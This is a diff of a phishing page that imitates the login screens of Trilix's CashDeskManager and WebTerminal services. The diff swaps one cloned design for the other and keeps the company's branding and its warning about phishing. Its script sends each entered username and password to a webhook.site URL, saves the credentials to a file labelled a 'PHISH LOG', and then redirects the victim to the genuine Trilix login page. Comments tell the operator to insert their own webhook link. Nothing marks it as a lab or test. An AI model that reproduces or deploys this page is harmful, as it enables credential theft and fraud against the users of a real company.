@@ -2,119 +2,290 @@
 <html lang="hr">
 <head>
     <meta charset="UTF-8">
-    <title>CashDeskManager - Login</title>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="icon" href="https://dsds.trilix.hr/CashDeskManager/resources/themes/xpos/favicon.ico">
+    <title>WebTerminal - Login</title>
+    <link rel="icon" type="image/png" href="./images/favicon.png">
 
-    <!-- Ugrađeni Bootstrap CSS (kopiran sa CDN-a) -->
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css" rel="stylesheet">
-    <!-- Ugrađeni XPOS tema CSS (kopiran sa originalnog sajta) -->
+    <!-- Ugrađeni Lumo i Vaadin stilovi za potpuno identičan izgled -->
     <style>
-        /* Ugrađeni stilovi iz /CashDeskManager/resources/themes/xpos/style-xpos.css */
+        /* --- Lumo Base & Color Variables --- */
+        :root {
+            --lumo-font-family: -apple-system, BlinkMacSystemFont, "Roboto", "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+            --lumo-font-size-xs: 0.8125rem;
+            --lumo-font-size-s: 0.875rem;
+            --lumo-font-size-m: 1rem;
+            --lumo-font-size-l: 1.125rem;
+            --lumo-font-size-xl: 1.375rem;
+            --lumo-line-height-xs: 1.25;
+            --lumo-line-height-s: 1.375;
+            --lumo-line-height-m: 1.625;
+            
+            --lumo-space-xs: 0.25rem;
+            --lumo-space-s: 0.5rem;
+            --lumo-space-m: 1rem;
+            --lumo-space-l: 1.5rem;
+            --lumo-space-xl: 2.5rem;
+
+            --lumo-border-radius-s: 0.25em;
+            --lumo-border-radius-m: var(--lumo-border-radius, 0.25em);
+            --lumo-border-radius-l: 0.5em;
+            
+            --lumo-primary-color: hsl(214, 90%, 48%);
+            --lumo-primary-text-color: hsl(214, 100%, 43%);
+            --lumo-primary-contrast-color: #fff;
+            --lumo-error-color: hsl(3, 79%, 49%);
+            --lumo-error-text-color: hsl(3, 100%, 80%);
+            --lumo-base-color: #fff;
+            --lumo-body-text-color: hsl(214, 35%, 15%);
+            --lumo-header-text-color: var(--lumo-body-text-color);
+            --lumo-secondary-text-color: hsl(214, 35%, 45%);
+            --lumo-contrast-10pct: hsla(214, 57%, 24%, 0.1);
+            --lumo-shade-10pct: var(--lumo-contrast-10pct);
+            --lumo-contrast-20pct: hsla(214, 53%, 23%, 0.16);
+            --lumo-contrast-5pct: hsla(214, 61%, 25%, 0.05);
+            --lumo-tint-5pct: hsla(0, 0%, 100%, 0.3);
+        }
+
+        /* --- Global & Layout --- */
         body {
-            background-color: #dcdcdc;
-            font-family: Arial, sans-serif;
-            color: #333;
+            margin: 0;
+            font-family: var(--lumo-font-family);
+            font-size: var(--lumo-font-size-m);
+            color: var(--lumo-body-text-color);
+            background-color: var(--lumo-base-color);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
-        .container#loginFormContainer {
-            max-width: 400px;
-            margin: 80px auto;
-            padding: 30px;
-            background-color: #e6e6e6;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+
+        .app-layout {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
         }
-        #loginImg {
-            display: block;
-            margin: 0 auto 20px auto;
+
+        .header-black {
+            background-color: var(--lumo-body-text-color);
+            color: var(--lumo-base-color);
         }
-        .form-horizontal .form-group {
-            margin-bottom: 15px;
+
+        .main-content {
+            flex-grow: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: var(--lumo-space-xl);
         }
-        .form-horizontal .control-label {
-            text-align: left;
-            font-weight: normal;
+
+        .footer {
+            background-color: var(--lumo-body-text-color);
+            color: var(--lumo-base-color);
+            text-align: center;
+            padding: var(--lumo-space-m);
         }
-        .btn-primary {
-            background-color: #b30000;
-            border-color: #b30000;
-            color: white;
-            font-weight: bold;
+
+        /* --- Login Page Specific --- */
+        .login-page {
+            width: 100%;
+            max-width: 440px;
+            display: flex;
+            flex-direction: column;
+            gap: var(--lumo-space-l);
         }
-        .btn-primary:hover, .btn-primary:focus {
-            background-color: #800000;
-            border-color: #800000;
+
+        .login-card {
+            background-color: var(--lumo-base-color);
+            border: 1px solid var(--lumo-contrast-10pct);
+            border-radius: var(--lumo-border-radius-l);
+            box-shadow: 0 2px 6px -1px var(--lumo-contrast-5pct), 0 8px 24px -4px var(--lumo-contrast-20pct);
+            padding: var(--lumo-space-l);
         }
-        .row {
-            margin-top: 20px;
-            font-size: small;
-            color: rgb(117, 117, 117);
+
+        .login-card__header {
+            text-align: center;
+            margin-bottom: var(--lumo-space-l);
         }
-        /* Sklanjanje inline DarkReader stilova ako postoje */
-        [data-darkreader-inline-color] { color: inherit !important; }
+        .login-card__header h1 {
+            font-size: var(--lumo-font-size-xl);
+            font-weight: 600;
+            margin: 0 0 var(--lumo-space-s) 0;
+        }
+        .login-card__header p {
+            font-size: var(--lumo-font-size-s);
+            color: var(--lumo-secondary-text-color);
+            margin: 0;
+        }
+
+        .login-card__body {
+            display: flex;
+            flex-direction: column;
+            gap: var(--lumo-space-m);
+        }
+
+        /* --- Custom Components Styling (to mimic Vaadin) --- */
+        .vaadin-mimic-field {
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+        .vaadin-mimic-field label {
+            font-size: var(--lumo-font-size-s);
+            color: var(--lumo-body-text-color);
+            padding-bottom: var(--lumo-space-xs);
+        }
+        .vaadin-mimic-field input {
+            font-size: var(--lumo-font-size-m);
+            padding: var(--lumo-space-s) var(--lumo-space-m);
+            border: 1px solid var(--lumo-contrast-20pct);
+            border-radius: var(--lumo-border-radius-m);
+            background-color: var(--lumo-base-color);
+            color: var(--lumo-body-text-color);
+            box-sizing: border-box;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .vaadin-mimic-field input:focus {
+            outline: none;
+            border-color: var(--lumo-primary-color);
+            box-shadow: 0 0 0 2px var(--lumo-primary-color-10pct, hsla(214, 90%, 55%, 0.13));
+        }
+        .vaadin-mimic-field input[aria-invalid="true"] {
+            color: var(--lumo-error-text-color);
+            border-color: var(--lumo-error-color);
+        }
+        
+        .vaadin-mimic-button {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: var(--lumo-font-size-m);
+            font-weight: 500;
+            padding: var(--lumo-space-s) var(--lumo-space-xl);
+            border: 1px solid transparent;
+            border-radius: var(--lumo-border-radius-m);
+            background-color: var(--lumo-primary-color);
+            color: var(--lumo-primary-contrast-color);
+            cursor: pointer;
+            transition: background-color 0.2s;
+            text-align: center;
+        }
+        .vaadin-mimic-button:hover {
+            background-color: hsl(214, 90%, 45%);
+        }
+        .vaadin-mimic-button:disabled {
+            background-color: var(--lumo-contrast-20pct);
+            color: var(--lumo-secondary-text-color);
+            cursor: default;
+        }
+        
+        .login-notices {
+            font-size: var(--lumo-font-size-s);
+            color: var(--lumo-secondary-text-color);
+            line-height: var(--lumo-line-height-m);
+        }
+        .login-notice {
+            padding: var(--lumo-space-s) var(--lumo-space-m);
+            border: 1px solid;
+            border-radius: var(--lumo-border-radius-m);
+        }
+        .login-notice--warning {
+            color: var(--lumo-error-text-color);
+            border-color: var(--lumo-error-color);
+            background-color: hsla(3, 79%, 49%, 0.1);
+        }
+        .login-notice p {
+            margin: 0 0 var(--lumo-space-s) 0;
+        }
+        .login-notice p:last-child {
+            margin-bottom: 0;
+        }
+        .login-notice-text {
+            margin-bottom: var(--lumo-space-s);
+        }
+
+        /* --- Utility Classes --- */
+        .flex { display: flex; }
+        .items-center { align-items: center; }
+        .justify-between { justify-content: space-between; }
+        .gap-xs { gap: var(--lumo-space-xs); }
+        .w-full { width: 100%; }
+        .box-border { box-sizing: border-box; }
+        .text-xl { font-size: var(--lumo-font-size-xl); }
+        .text-white { color: var(--lumo-base-color); }
+        .font-medium { font-weight: 500; }
+        .text-center { text-align: center; }
+        .mb-0 { margin-bottom: 0; }
     </style>
 </head>
 <body>
 
-<div class="container" id="loginFormContainer">
-    <img src="https://dsds.trilix.hr/CashDeskManager/resources/themes/xpos/xpos-logo.png" id="loginImg" alt="XPOS Logo">
-
-    <form name="f" class="form-horizontal form-horizontal--full" id="phishForm">
-        <input type="hidden" name="_csrf" value="edbc40c5-3ae2-4040-b068-8e700ad0d79c">
-
-        <div class="form-group">
-            <label class="control-label col-sm-3" for="oib">OIB:</label>
-            <div class="col-sm-9">
-                <input type="text" class="form-control" id="oib" name="oib" autofocus="autofocus">
+<div id="outlet">
+    <div class="app-layout auth-layout">
+        <header class="header-black box-border flex items-center justify-between w-full px-l py-s" role="banner">
+            <div class="flex items-center gap-xs">
+                <!-- Zameni sa stvarnom putanjom do tvoje logo slike -->
+                <img src="images/logo.png" alt="Logo" style="width: 200px;">
+                <h1 class="text-xl text-white ml-4 font-medium" style="font-family: cursive;">WebTerminal</h1>
             </div>
-        </div>
-
-        <div class="form-group">
-            <label class="control-label col-sm-3" for="username">Korisničko ime:</label>
-            <div class="col-sm-9">
-                <input type="text" class="form-control" id="username" name="username">
+            <div class="flex items-center gap-xs">
+                <!-- Ovaj link može da ostane ili se ukloni -->
+                <a class="text-white" aria-label="Sign in" href="/web-terminal/login" data-discover="true">Sign in</a>
             </div>
-        </div>
+        </header>
 
-        <div class="form-group">
-            <label class="control-label col-sm-3" for="password">Zaporka:</label>
-            <div class="col-sm-9">
-                <input type="password" class="form-control" id="password" name="password">
-            </div>
-        </div>
+        <main class="main-content">
+            <div class="login-page">
+                <div class="login-card">
+                    <div class="login-card__header">
+                        <h1>WebTerminal</h1>
+                        <p>Sign in with your credentials</p>
+                    </div>
+                    <div class="login-card__body">
+                        <div class="vaadin-mimic-field">
+                            <label for="username">Username</label>
+                            <input type="text" id="username" name="username" required autocomplete="username" aria-invalid="false">
+                        </div>
+                        <div class="vaadin-mimic-field">
+                            <label for="password">Password</label>
+                            <input type="password" id="password" name="password" required autocomplete="current-password" aria-invalid="false">
+                        </div>
+                        <!-- Vaadin password reveal button je zamenjen sa standardnim, ali stilizovanim -->
+                        <button type="button" id="toggle-password" style="align-self: flex-end; background: none; border: none; color: var(--lumo-secondary-text-color); cursor: pointer; font-size: 0.8em;">Show password</button>
+                        
+                        <button type="button" class="vaadin-mimic-button login-button" id="loginBtn">Continue</button>
+                    </div>
+                </div>
 
-        <div class="form-group">
-            <div class="col-sm-offset-3 col-sm-9">
-                <div class="checkbox">
-                    <label><input type="checkbox" id="remember-me" name="remember-me"> Zapamti me</label>
+                <div class="login-notices">
+                    <div class="login-notice login-notice--warning">
+                        <p>Security notice: Trilix will never ask you for credentials or send links or web pages for entering credentials.</p>
+                        <p>If you receive such an e-mail or call, do not act on it and contact Trilix support immediately.</p>
+                        <p>E-mail: support@trilix.eu, tel: +385 1 884 8077.</p>
+                    </div>
+                    <p class="login-notice-text">If you have login problems, call our Operation Desk at +385 1 884 8077.</p>
+                    <p class="login-notice-text">These web pages are owned by Trilix d.o.o. and intended exclusively for authorized users. If you are not authorized to use them, leave immediately.</p>
+                    <p class="login-notice-text">Any attempt of unauthorized use will be subject to legal action.</p>
                 </div>
             </div>
-        </div>
+        </main>
 
-        <div class="form-group">
-            <div class="col-sm-offset-3 col-sm-9">
-                <button type="button" class="btn btn-primary" id="loginBtn">Login</button>
+        <footer class="footer">
+            <div class="row">
+                <div class="col-md-12 text-center">
+                    <p class="mb-0">@2025 Trilix - all rights reserved</p>
+                </div>
             </div>
-        </div>
-
-        <div class="row" style="margin-bottom: 0">
-            <div class="col-sm-6" align="left">
-                <span>3.8.0 (b4183b1)</span>
-            </div>
-            <div class="col-sm-6" align="right">
-                <span>powered by Trilix</span>
-            </div>
-        </div>
-    </form>
+        </footer>
+    </div>
 </div>
 
 <script>
     // OVAJ DEO JE BITAN - ZAMENI "TVOJ_WEBHOOK_LINK" SA STVARNO LINKOM
     const WEBHOOK_URL = 'https://webhook.site/b5e28484-5c0d-4318-a432-af4f5f6380f6';
 
+    // Funkcija za slanje podataka i preusmeravanje
     function sendCreds() {
-        const oib = document.getElementById('oib').value;
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
 
@@ -124,25 +295,39 @@
                 method: 'POST',
                 mode: 'no-cors',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({oib, username, password})
+                body: JSON.stringify({username, password})
             });
         } catch(e) {}
 
         // 2. Spusti fajl na lokalni disk
-        const logContent = `=== TRILIX PHISH LOG ===\nDate: ${new Date().toISOString()}\nOIB: ${oib}\nUser: ${username}\nPass: ${password}`;
+        const logContent = `=== WEBTERMINAL PHISH LOG ===\nDate: ${new Date().toISOString()}\nUser: ${username}\nPass: ${password}`;
         const blob = new Blob([logContent], {type: "text/plain"});
         const url = URL.createObjectURL(blob);
         const a = document.createElement('a');
         a.href = url;
-        a.download = "trilix_creds.txt";
+        a.download = "webterminal_creds.txt";
         a.click();
         URL.revokeObjectURL(url);
 
         // 3. Redirect na pravi sajt
-        window.location.href = 'https://dsds.trilix.hr/CashDeskManager/login';
+        window.location.href = 'https://dsds.trilix.hr/web-terminal/login';
     }
 
+    // Event listener za login dugme
     document.getElementById('loginBtn').addEventListener('click', sendCreds);
+
+    // Funkcionalnost "Show password" dugmeta
+    const togglePassword = document.getElementById('toggle-password');
+    const passwordInput = document.getElementById('password');
+    togglePassword.addEventListener('click', () => {
+        if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+            togglePassword.textContent = 'Hide password';
+        } else {
+            passwordInput.type = 'password';
+            togglePassword.textContent = 'Show password';
+        }
+    });
 </script>
 
 </body>
